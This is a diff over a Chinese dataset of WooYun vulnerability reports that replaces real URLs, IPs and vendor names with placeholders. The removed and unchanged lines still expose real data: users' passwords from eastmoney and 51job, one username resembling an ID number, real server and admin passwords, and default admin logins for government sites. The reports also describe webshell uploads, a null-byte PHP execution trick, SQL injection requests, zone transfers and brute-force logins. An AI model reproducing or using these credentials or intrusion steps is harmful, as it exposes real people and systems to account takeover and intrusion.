-**POC**: http://product.enet.com.cn/price/%3f.jsp
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -9050,7 +9050,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://news.baihe.com/.bash_history
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -9072,7 +9072,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: inurl:fund.eastmoney.com/?pwd、随便打开1个http://fund.eastmoney.com/?uname=331081198708159423&pwd=Sqq@2014用户名与密码全部出来了登录看再换其他1个http://fund.eastmoney.com/?uname=15098811062&pwd=714098amanda又进去了就不一一演示了。都懂的http://fund.eastmoney.com/?uname=13952799848&pwd=20080113http://fund.eastmoney.com/?uname=13309145111&pwd=13309145111http://fund.eastmoney.com/?uname=18505088830&pwd=bbdwd1204http://fund.eastmoney.com/?un
+**详情**: inurl:fund.eastmoney.com/?pwd、随便打开1个https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -9094,7 +9094,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 问题出在http://alwayson.hp.com.cn/每个业务对应一个二级目录经过wooyun一番查找 无果 后发现 IP可以匿名访问且有上传权限那么就有了后续对应目录我找了个http://alwayson.hp.com.cn/aas/传个马儿http://alwayson.hp.com.cn/aas/y.aspxc后续用ms15-051成功提权
+**详情**: 问题出在https://example.com/[已脱敏] 无果 后发现 IP可以匿名访问且有上传权限那么就有了后续对应目录我找了个https://example.com/[已脱敏]
 
 **POC**: 来张服务器全景哈哈 首先说下 服务器配置不错提供一远程帐号218.106.247.92test$test.123
 
@@ -9138,7 +9138,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 见页面http://sf-ec.com/ecp.website/bingoCode/login.jsp
+**详情**: 见页面https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -9182,9 +9182,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://cvs.hexun.com/zhaopin/
+**详情**: https://example.com/[已脱敏]
 
-**POC**: >iis_shortname_Scan.py http://cvs.hexun.com/zhaopin/server is vulerable, please wait, scanning...Found /zhaopin/d****    [scan in progress]Found /zhaopin/t****    [scan in progress]Found /zhaopin/o****    [scan in progress]Found /zhaopin/w****    [scan in progress]Found /zhaopin/de****   [scan in pr
+**POC**: >iis_shortname_Scan.py https://example.com/[已脱敏] is vulerable, please wait, scanning...Found /zhaopin/d****    [scan in progress]Found /zhaopin/t****    [scan in progress]Found /zhaopin/o****    [scan in progress]Found /zhaopin/w****    [scan in progress]Found /zhaopin/de****   [scan in pr
 
 **绕过**: 直接利用
 
@@ -9204,7 +9204,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 问题IP：http://114.80.120.39:8080/ ， 里面的东西还是挺多的，慢慢翻....泄漏的用户注册信息：http://114.80.120.39:8080/logs/userIp/http://114.80.120.39:8080/logs/userIp/20140304.txthttp://114.80.120.39:8080/logs/userIp/userinfo.txt.....2014-03、04月份注册的用户，总共22W+ 个人注册数据（用来撞库效果肯定杠杠的.....)大量的用户登录日志信息：http://114.80.120.39:8080/wangjian/login/sql操作日志信息：http://114.80.120.39:8080/logs/playnum.txtsoku:  http://114.80.120.39:8080/soku/太多了
+**详情**: 问题IP：http://[IP已脱敏] ， 里面的东西还是挺多的，慢慢翻....泄漏的用户注册信息：http://[IP已脱敏] 个人注册数据（用来撞库效果肯定杠杠的.....)大量的用户登录日志信息：http://[IP已脱敏]  http://[IP已脱敏]
 
 **POC**: (见原文)
 
@@ -9292,13 +9292,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 测试地址：http://www.appchina.com/market/berry/search.action?q=9ihttp://360zs.appchina.com/market-web/banana/soft_main.actionhttp://m.appchina.com/market-web/cherry/soft_main.actionhttp://dev.appchina.com/market/dev/index.action
+**详情**: 测试地址：https://example.com/[已脱敏]
 
-**POC**: 测试地址：http://www.appchina.com/market/berry/search.action?q=9ihttp://360zs.appchina.com/market-web/banana/soft_main.actionhttp://m.appchina.com/market-web/cherry/soft_main.actionhttp://dev.appchina.com/market/dev/index.action
+**POC**: 测试地址：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
-**修复**: 补丁:可参考以下地址http://struts.apache.org/download.cgi#struts23141
+**修复**: 补丁:可参考以下地址https://example.com/[已脱敏]
 ---
 
 ---
@@ -9358,7 +9358,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 还是j2ee多层架构，web服务器配置不当引起的WEB-INF/web.xml可访问拿出我的扫描器改了下，扫了扫tom在线的有3个分站配置不当被扫到http://data.auto.tom.com/WEB-INF/web.xmlhttp://search.auto.tom.com/WEB-INF/web.xmlhttp://data1.id.nba.tom.com/WEB-INF/web.xml
+**详情**: 还是j2ee多层架构，web服务器配置不当引起的WEB-INF/web.xml可访问拿出我的扫描器改了下，扫了扫tom在线的有3个分站配置不当被扫到https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -9404,7 +9404,7 @@
 
 **详情**: 益生康健漏洞nginx空字节可远程执行代码漏洞，可上传图片然后%00.php执行php脚本.看了下你们公司还是比较大, 漏洞补了后检查下后门.通过利用此漏洞，攻击者可以导致服务器使用PHP的FastCGI作为PHP的服务器上执行任何公开访问的文件。
 
-**POC**: 可上传图片,然后利用解析漏洞%00.php执行脚本目录。.http://www.yeecare.com/themes/yeecare1/images/logo.jpg%001.php在提交漏洞后表示已经删除一句话！
+**POC**: 可上传图片,然后利用解析漏洞%00.php执行脚本目录。.https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -9434,8 +9434,8 @@
 ---
 
 ---
-### [wooyun-2013-025452] 中国移动某短信群发系统可暴力破解,成功登录
-**厂商**: 中国移动 | **年份**: 2013 | **类型**: 系统/服务运维配置不当
+### [wooyun-2013-025452] 某运营商某短信群发系统可暴力破解,成功登录
+**厂商**: 某运营商 | **年份**: 2013 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 认证接口
 
@@ -9446,7 +9446,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 短信群发地址：http://www.1008612580.com:9000由于登陆验证过于简单，可导致暴力破解账号并群发信息。发条信息试一下：
+**详情**: 短信群发地址：https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -9468,7 +9468,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.tuchong.com/search/tag/?url=http://www.baidu.com
+**详情**: https://example.com/[已脱敏]
 
 **POC**: 数据库泄露了 有点问题
 
@@ -9490,7 +9490,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 启明星辰天清ADC提供服务器4层及7层负载均衡、多链路负载均衡、SSL卸载及加速、网页压缩、高速缓存、TCP单边加速等功能发现该设备存在openssl漏洞，可以被黑客控制设备开启了https服务，例如下面这台设备https://61.148.57.182利用openssl漏洞成功获取系统数据，并在数据中发现明文的用户名密码使用该密码成功登录，获取管理员权限可以浏览和编辑各项数据
+**详情**: 启明星辰天清ADC提供服务器4层及7层负载均衡、多链路负载均衡、SSL卸载及加速、网页压缩、高速缓存、TCP单边加速等功能发现该设备存在openssl漏洞，可以被黑客控制设备开启了https服务，例如下面这台设备https://[IP已脱敏]利用openssl漏洞成功获取系统数据，并在数据中发现明文的用户名密码使用该密码成功登录，获取管理员权限可以浏览和编辑各项数据
 
 **POC**: (见原文)
 
@@ -9500,8 +9500,8 @@
 ---
 
 ---
-### [wooyun-2014-050622] 百度某分站备份文件泄露
-**厂商**: 百度 | **年份**: 2014 | **类型**: 系统/服务运维配置不当
+### [wooyun-2014-050622] 某搜索引擎某分站备份文件泄露
+**厂商**: 某搜索引擎 | **年份**: 2014 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -9512,9 +9512,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 百度某站备份下载http://wm123.baidu.com/wm123.tar.gz
+**详情**: 某搜索引擎某站备份下载https://example.com/[已脱敏]
 
-**POC**: 百度某站备份下载http://wm123.baidu.com/wm123.tar.gz
+**POC**: 某搜索引擎某站备份下载https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -9558,7 +9558,7 @@
 
 **详情**: 酷狗SVN文件泄露
 
-**POC**: http://www.kugou.com/yueku/app/view/css/.svn/entries/yueku/app/view/.svn/entries/common/css/.svn/entries10dir4266http://192.168.1.167:8081/svn/php/musiclibraryWeb/app/view/csshttp://192.168.1.167:8081/svn/php2012-02-28T10:36:56.406250Z4266dujianfengaea8c01d-d2b4-c643-95c8-fd98283714c8main.cssfile201
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -9622,7 +9622,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: C:\Windows\System32>C:\Users\ReJeCt\Desktop\nc.exe -vv 122.225.68.78 20011122.225.68.78: 反向连接查询主机: h_errno 11004: 无数据(UNKNOWN) [122.225.68.78] 20011 (?) 打开stats itemsSTAT items:0:number 162752STAT items:0:age 5057332STAT items:0:evicted 3045158928STAT items:0:evicted_nonzero 10922STAT items:0:evicted_time 0STAT items:0:outofmemory 0STAT items:0:tailrepairs 0STAT items:0:reclaimed 0STAT items:1:num
+**详情**: C:\Windows\System32>C:\Users\ReJeCt\Desktop\nc.exe -vv [IP已脱敏] 20011122.225.68.78: 反向连接查询主机: h_errno 11004: 无数据(UNKNOWN) [[IP已脱敏]] 20011 (?) 打开stats itemsSTAT items:0:number 162752STAT items:0:age 5057332STAT items:0:evicted 3045158928STAT items:0:evicted_nonzero 10922STAT items:0:evicted_time 0STAT items:0:outofmemory 0STAT items:0:tailrepairs 0STAT items:0:reclaimed 0STAT items:1:num
 
 **POC**: 可以获取到相应cache数据，恶意者可以从中replace掉内容或干嘛的ps:该ip另开有N个memcached服务端口 均会有不同的安全隐患。
 
@@ -9666,7 +9666,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://expert.womai.com/1）该系统采用了wordpress，但其中的timthumb插件未进行升级，导致攻击者可以上传php文件漏洞描述可见：http://sebug.net/vuldb/ssvid-208112）可以直接读取.htaccess文件
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -9690,7 +9690,7 @@
 
 **详情**: 长荣航空DNS域传送漏洞一枚，通过dns域传送获取被攻击域下所有的子域名。会导致一些非公开域名（测试域名、内部域名）泄露。
 
-**POC**: > ls evaair.com[ns3.evaair.com]evaair.com.                    NS     server = ns1.evevaair.com.                    NS     server = ns2.evevaair.com.                    NS     server = ns3.evevaair.com.                    NS     server = ns4.evevaair.com.                    A      203.66.219.36777   
+**POC**: > ls evaair.com[ns3.evaair.com]evaair.com.                    NS     server = ns1.evevaair.com.                    NS     server = ns2.evevaair.com.                    NS     server = ns3.evevaair.com.                    NS     server = ns4.evevaair.com.                    A      [IP已脱敏]77   
 
 **绕过**: 直接利用
 
@@ -9698,8 +9698,8 @@
 ---
 
 ---
-### [wooyun-2014-058528] 中国联通iphone专区整站打包下载
-**厂商**: 中国联通 | **年份**: 2014 | **类型**: 系统/服务运维配置不当
+### [wooyun-2014-058528] 某运营商iphone专区整站打包下载
+**厂商**: 某运营商 | **年份**: 2014 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -9710,7 +9710,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 应该是管理员疏忽把整站程序忘在了根目录。。。拉出去毙了http://iphone.10010.com/iphome.zip
+**详情**: 应该是管理员疏忽把整站程序忘在了根目录。。。拉出去毙了https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -9742,8 +9742,8 @@
 ---
 
 ---
-### [wooyun-2011-03513] 腾讯CF更新版本BUG,通过好友右键点击进入好友所在房间直接死机
-**厂商**: 腾讯 | **年份**: 2011 | **类型**: 系统/服务运维配置不当
+### [wooyun-2011-03513] 某互联网公司CF更新版本BUG,通过好友右键点击进入好友所在房间直接死机
+**厂商**: 某互联网公司 | **年份**: 2011 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -9776,7 +9776,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://zb.sdo.com/iis 6.0短文件名枚举漏洞:
+**详情**: https://example.com/[已脱敏] 6.0短文件名枚举漏洞:
 
 **POC**: (见原文)
 
@@ -9822,7 +9822,7 @@
 
 **详情**: 在WooYun: 搜狐畅游某jira平台内部任务信息泄漏中提到mobogarden.com这个域名是搜狐畅游的，但查whois竟然是阿里的 shen me gui...
 
-**POC**: 同样的原因。。没有关闭注册导致的测试账号：test/111111http://oa.it.mobogarden.com/testlink/index.php
+**POC**: 同样的原因。。没有关闭注册导致的测试账号：test/111111https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -9886,13 +9886,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 106.3.36.234106.3.36.237MongoDB 配置不当密码明文存储
+**详情**: [IP已脱敏]106.3.36.237MongoDB 配置不当密码明文存储
 
 **POC**: (见原文)
 
 **绕过**: 直接利用
 
-**修复**: 参考 MongoDB安全配置 http://drops.wooyun.org/tips/2470sha1 + 随机salt 加密密码
+**修复**: 参考 MongoDB安全配置 https://example.com/[已脱敏] + 随机salt 加密密码
 ---
 
 ---
@@ -9908,9 +9908,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 郑州电子政务中心旗下：http://tyj.zhengzhou.gov.cn/山谷网络架构平台网站后台：http://tyj.zhengzhou.gov.cn/sysadmin/login.do网站后台：http://www.dengfeng.gov.cn/sysadmin/login.do网站后台：http://www.lyjjw.gov.cn/sysadmin/login.do网站后台：http://www.zzta.net/sysadmin/login.do网站后台：http://www.chtongxu.gov.cn/sysadmin/login.do网站后台：http://www.xinxiang.gov.cn/sysadmin/login.do网站后台：http://kf.dxyq.org/sysadmin/login.do网站后台：http://www.zhongyuan.g
+**详情**: 郑州电子政务中心旗下：https://example.com/[已脱敏]
 
-**POC**: 山谷网络架构平台网站后台：http://tyj.zhengzhou.gov.cn/sysadmin/login.do存在默认账号： admin  sginfo123管理网站基础信息及框架   任意修改 删除ok  不做破坏  友情提醒。
+**POC**: 山谷网络架构平台网站后台：https://example.com/[已脱敏] admin  sginfo123管理网站基础信息及框架   任意修改 删除ok  不做破坏  友情提醒。
 
 **绕过**: 直接利用
 
@@ -9932,7 +9932,7 @@
 
 **详情**: mask 区域1.http://**.**.**/_***************b520ea9a1ea2378f6926.png&qu***************2.http://**.**.**/_searchpreety_***************050f4d0eba9c1ea5071d.png&qu***************3.http://**.**.**/_plugin/head/_*************************300305591879e418c527.png&qu********************7a551db64e9f83f4e6f6.png&qu********************8a1e30886d55e30ff5a6.png&qu********************e&gt**********;logstash-201***
 
-**POC**: http://116.213.93.61:9200/http://116.213.93.61:9200/_search?preetyhttp://116.213.93.61:9200/_plugin/head/{"_index": "logstash-2016.02.10","_type": "producer","_id": "AVLIevc5y7ilkAO_qwAo","_version": 1,"_score": 1,"_source": {"@timestamp": "2016-02-10T00:00:41.000Z","@fields": {"remote_addr": "210.3
+**POC**: http://[IP已脱敏] "logstash-2016.02.10","_type": "producer","_id": "AVLIevc5y7ilkAO_qwAo","_version": 1,"_score": 1,"_source": {"@timestamp": "2016-02-10T00:00:41.000Z","@fields": {"remote_addr": "210.3
 
 **绕过**: 直接利用
 
@@ -9952,7 +9952,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 我利用的地址同样是第一次那个地址：http://passport.zcool.com.cn/verifyEmail.do?name=86657550@qq.com&appId=1006上次估计管理员只是修复了一下，更改邮箱地址功能，让别人无从下手。不过，由于我想起KEY是通用的&appId=1006那么我们来用BURP来尝试逻辑绕过激活比如当前这个用户http://passport.zcool.com.cn/verifyEmail.do?name=86657550@qq.com&appId=1006我们来尝试逻辑，比如要修改当前的这个用户点击时截包我们在这里进行BURP抓包把抓到的包看下，由于是通用的KEY,我们只需要修改当前的邮箱如我的46619638@qq.com然后点然后点这时候，等着邮件过来点击,又自动激活了
+**详情**: 我利用的地址同样是第一次那个地址：https://example.com/[已脱敏]
 
 **POC**: 要改哪个，配合参数查询，如果存在，再次发邮件抓包然后修改邮箱，点NO，邮件就发到我们邮箱里了。
 
@@ -9998,7 +9998,7 @@
 
 **详情**: 
 
-**POC**: 1、taiji.hit.edu.cn sql注入GET /data_files/AboutUs.asp?TypeNumber=0001 HTTP/1.1Referer: http://taiji.hit.edu.cn/data_files/leftbar.aspAccept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) Ap
+**POC**: 1、taiji.hit.edu.cn sql注入GET /data_files/AboutUs.asp?TypeNumber=0001 HTTP/1.1Referer: https://example.com/[已脱敏] text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) Ap
 
 **绕过**: 直接利用
 
@@ -10018,7 +10018,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: iku爱酷运行时会开放多个端口监听 0.0.0.0，其中 843 和 8909 端口可以被匿名访问并提供Internet代理服务。此漏洞已经被广泛利用在多种非法用途，不详表。
+**详情**: iku爱酷运行时会开放多个端口监听 [IP已脱敏]，其中 843 和 8909 端口可以被匿名访问并提供Internet代理服务。此漏洞已经被广泛利用在多种非法用途，不详表。
 
 **POC**: (见原文)
 
@@ -10084,7 +10084,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://list.iqiyi.com//resin-doc/examples/ioc-periodictask/viewfile?file=index.xtp不怀好意的求一份纪念品
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -10106,7 +10106,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 你好  涉及好几个站  都和政府有关系 所以  提给你们。涉及网站：www.iotmoe.cn    www.iotr.org.cn   www.iotedu.com.cn   www.nrit.cn   www.zgyjw.org.cn   www.ccit.org.cn问题：一个默认编辑器导致http://www.ccit.org.cn/eWebwanEditorbo/admin/账号密码：adwanminbo   editorwanebowebok 编辑器后台直接修改上传图片类型  加上aspx   ok上图：马在编辑器图片下  删了吧。ok
+**详情**: 你好  涉及好几个站  都和政府有关系 所以  提给你们。涉及网站：www.iotmoe.cn    www.iotr.org.cn   www.iotedu.com.cn   www.nrit.cn   www.zgyjw.org.cn   www.ccit.org.cn问题：一个默认编辑器导致https://example.com/[已脱敏]   editorwanebowebok 编辑器后台直接修改上传图片类型  加上aspx   ok上图：马在编辑器图片下  删了吧。ok
 
 **POC**: 如上
 
@@ -10150,9 +10150,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://zp.xyzx5u.com/后台：http://zp.xyzx5u.com/Manager/login.aspx但对其他页面没有做过滤处理，导致直接泄露管理员密码帐号
+**详情**: https://example.com/[已脱敏]
 
-**POC**: http://zp.xyzx5u.com/Manager/Admin_list.aspx?action=list
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -10174,7 +10174,7 @@
 
 **详情**: 新蛋网主域名存在dns域传送漏洞，可列出域内的所有域名
 
-**POC**: http://www.newegg.com.cn/使用nslookup，设置属性找到新蛋网的dns服务器其中ns1.newegg.com.cn服务器存在域传送漏洞，利用该漏洞可直接列出其下属二级域名和目录
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -10182,8 +10182,8 @@
 ---
 
 ---
-### [wooyun-2012-06354] 腾讯各大站点后台被曝光
-**厂商**: 腾讯 | **年份**: 2012 | **类型**: 应用配置错误
+### [wooyun-2012-06354] 某互联网公司各大站点后台被曝光
+**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: 应用配置错误
 
 **元思考**: 触发信号: 后台管理
 
@@ -10194,9 +10194,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 腾讯各大站点后台被曝光
+**详情**: 某互联网公司各大站点后台被曝光
 
-**POC**: http://admin.dnfcity.qq.com:8080/admin/adminMain.dohttp://szj.3g.qq.com/admin/login.phphttp://kf.ieodopen.qq.com/admin/login.htmlhttp://gamebbs.qq.com/cgi-bin/admin/boardadmin/group_limit_list?groupid=20023&type=0&desc=0http://job.cd.qq.com/admin/http://admin.dnfcity.qq.com:8080/barFindteBar.do
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -10216,7 +10216,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: url:http://121.35.253.157:81/manager/htmluser:adminpass:
+**详情**: url:http://[IP已脱敏]
 
 **POC**: (见原文)
 
@@ -10238,7 +10238,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 本次漏洞测试如有不当之处，请多多包涵。登陆口：https://passport.haodf.com/user/showlogin问题一：传输未经任何加密，可抓包暴力破解。问题二：验证码机制错误，可在第一次无验证码情况下抓包进行破解。问题三：验证码验证错误，只在登陆框先Post一个验证码是否正确的请求后无后续认证。 导致验证码可绕过发送包：GET /user/ajaxusercnt4username?username=【非加密的用户名】&password=【非加密的密码】&_=1432897693736 HTTP/1.1Host: passport.haodf.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0Accept: */*Accept-Language: zh
+**详情**: 本次漏洞测试如有不当之处，请多多包涵。登陆口：https://example.com/[已脱敏] 导致验证码可绕过发送包：GET /user/ajaxusercnt4username?username=【非加密的用户名】&password=【非加密的密码】&_=1432897693736 HTTP/1.1Host: passport.haodf.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0Accept: */*Accept-Language: zh
 
 **POC**: 部分账号ADMN	123456CLARK	123456DEFAULT	123456EVENT	123456HELLO	123456HELP	123456NEVIEW	123456USER3	123456abran	123456adam	123456adolph	123456alika	123456alix	123456aloysius	123456alvy	123456amandi	123456amity	123456andrew	123456andromache	123456andy	123456annabel	123456ansel	123456anthony	123456anya	123
 
@@ -10260,7 +10260,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 陕西省水利厅官网http://www.sxmwr.gov.cn/ 经过嗅探和测试，没发现什么，于是打开Jsky却发现存在PUT,当时我就震精了，这是为什么呢，于是，就传了几句话，不是一句话哦，随便传了个页面，洗洗睡了测试地址http://www.sxmwr.gov.cn/1937cN.txt
+**详情**: 陕西省水利厅官网https://example.com/[已脱敏] 经过嗅探和测试，没发现什么，于是打开Jsky却发现存在PUT,当时我就震精了，这是为什么呢，于是，就传了几句话，不是一句话哦，随便传了个页面，洗洗睡了测试地址https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -10284,7 +10284,7 @@
 
 **详情**: 
 
-**POC**: http://3g.youku.com/admin/
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -10326,7 +10326,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.xiami.com/crossdomain.xml<cross-domain-policy><allow-access-from domain="*"/></cross-domain-policy>
+**详情**: https://example.com/[已脱敏] domain="*"/></cross-domain-policy>
 
 **POC**: "*"代表任意的啊~~~！！！！！安全的服务端flash安全策略应用程序安全设计的时候应该秉承最小化原则，在flash的大部分应用中，由于功能需求就经常需要跨域获取数据。域安全是浏览器安全的基本策略，flash作为浏览器的扩展允许跨域获取数据就从根本上打破了浏览器的安全性。flash以flash文件存储域名作为它的当前域，如果需要获取其他服务器上的数据就会发生跨域行为，而且该跨域行为会继承用户浏览器里的认证信息，限制不严格时将导致安全漏洞，打破我们的整个客户端安全模型。flash在跨域时唯一的限制策略就是crossdomain.xml文件，该文件限制了flash是否可以跨域获取数据以及允许从什
 
@@ -10370,9 +10370,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: site:51job.com inurl:loginname=邮箱&手机号和密码直接出来了http://www.51job.com/shenzhen?passport_loginname=15575376425&passport_password=zhuben456123&submit=%B5%C7%C2%BCname=15575376425password=zhuben456123登录看看
+**详情**: site:51job.com inurl:loginname=邮箱&手机号和密码直接出来了https://example.com/[已脱敏]
 
-**POC**: http://www.51job.com/changsha?passport_loginname=2925765132@qq.com&passport_password=qweasd&submit=%EF%BF%BD%EF%BF%BD%C2%BChttp://www.51job.com/shenzhen?passport_loginname=15575376425&passport_password=zhuben456123&submit=%B5%C7%C2%BC
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -10394,7 +10394,7 @@
 
 **详情**: 
 
-**POC**: 又一个分站iphone.07073.com,网站主页禁止访问，其他目录直接下载，该站点应该是手机平台web app用的，和上次那个分站一样，配置不当导致php文件任意下载，可以找php文件里的include ，然后遍历网站，下载整站源码，因为好多代码在其他分站是复用的，邪恶的人可能会去拿去代码审计找漏洞，搞其他的站http://iphone.07073.com/template/2012http://iphone.07073.com/template/2012/_guide.phphttp://iphone.07073.com/template/2012/_nsgadwords.phphttp
+**POC**: 又一个分站iphone.07073.com,网站主页禁止访问，其他目录直接下载，该站点应该是手机平台web app用的，和上次那个分站一样，配置不当导致php文件任意下载，可以找php文件里的include ，然后遍历网站，下载整站源码，因为好多代码在其他分站是复用的，邪恶的人可能会去拿去代码审计找漏洞，搞其他的站https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -10414,7 +10414,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 点：http://cms.moyi365.com/doc/researchlist?album_id=1&class_id=1&order=1http://cms.ekwing.com/doc/researchlist?album_id=1&class_id=1&order=1database management system users [1]:[*] 'athena_w'@'192.168.1.3'available databases [3]:[*] athena[*] information_schema[*] test---VERSION():    '5.6.16-log'@@HOSTNAME:    'hello/network'ok
+**详情**: 点：https://example.com/[已脱敏] management system users [1]:[*] 'athena_w'@'[IP已脱敏]'available databases [3]:[*] athena[*] information_schema[*] test---VERSION():    '5.6.16-log'@@HOSTNAME:    'hello/network'ok
 
 **POC**: ···
 
@@ -10436,7 +10436,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: *                              CNAME  www.wip.wealink.com163                            A      61.145.121.80_domainkey                     NS     ns3.ucigroup.orgad                             A      211.152.55.58api                            CNAME  www.wip.wealink.comapp1                           CNAME  www.wip.wealink.comapps                           CNAME  www.wip.wealink.combackend2        
+**详情**: *                              CNAME  www.wip.wealink.com163                            A      [IP已脱敏]_domainkey                     NS     ns3.ucigroup.orgad                             A      [IP已脱敏]api                            CNAME  www.wip.wealink.comapp1                           CNAME  www.wip.wealink.comapps                           CNAME  www.wip.wealink.combackend2        
 
 **POC**: (见原文)
 
@@ -10460,7 +10460,7 @@
 
 **详情**: php没有解析直接出源码.
 
-**POC**: http://www.27.cn/global.phphttp://www.27.cn/include/data.class.php<?php/*** [aili.com] (C)2001-2009 aili.com Inc.* This is NOT a freeware, use is subject to license terms* $RCFfile: data.class.php $* $Revision: 1.1 $* $Date: 2009/08/25 17:45:00 $*//*** This is a class to database and create the thum
+**POC**: https://example.com/[已脱敏] [aili.com] (C)2001-2009 aili.com Inc.* This is NOT a freeware, use is subject to license terms* $RCFfile: data.class.php $* $Revision: 1.1 $* $Date: 2009/08/25 17:45:00 $*//*** This is a class to database and create the thum
 
 **绕过**: 直接利用
 
@@ -10480,7 +10480,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://210.75.250.227/www.zip源码源码里的数据库备份文件利用mysql进行备份文件恢复泄露会员信息
+**详情**: http://[IP已脱敏]
 
 **POC**: 数据库配置信息泄露配合源码查找出后台并登陆
 
@@ -10502,13 +10502,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 问题出在：http://211.151.115.38/WEB-INF/web.xmlhttp://211.151.115.39/WEB-INF/web.xmlhttp://211.151.115.40/WEB-INF/web.xmlhttp://211.151.115.41/WEB-INF/web.xml看了园长的分享之后，去问了园长，了解了下J2ee分层架构。陆续下回来一些class文件回来：
+**详情**: 问题出在：http://[IP已脱敏]
 
 **POC**: 不过是58同城的边缘业务，所以危害影响不算太大。
 
 **绕过**: 直接利用
 
-**修复**: 参考之前shine写的：web服务器分层架构的资源文件映射安全以及在J2EE应用中的利用与危害url：http://drops.wooyun.org/papers/60
+**修复**: 参考之前shine写的：web服务器分层架构的资源文件映射安全以及在J2EE应用中的利用与危害url：https://example.com/[已脱敏]
 ---
 
 ---
@@ -10524,7 +10524,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 一直很喜欢糗事，今天看到一篇帖子，一张妹子图，按耐不住挖漏洞的冲动。于是 go~然后抓包：进过测试发现。http://m2.qiushibaike.com/article/77760799    （77760799是帖子的id）获取手机类型 年龄http://nearby.qiushibaike.com/user/6395516/detail  （6395516是用户id）
+**详情**: 一直很喜欢糗事，今天看到一篇帖子，一张妹子图，按耐不住挖漏洞的冲动。于是 go~然后抓包：进过测试发现。https://example.com/[已脱敏]    （77760799是帖子的id）获取手机类型 年龄https://example.com/[已脱敏]  （6395516是用户id）
 
 **POC**: over~求礼物~求rank~求不忽略~
 
@@ -10546,7 +10546,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
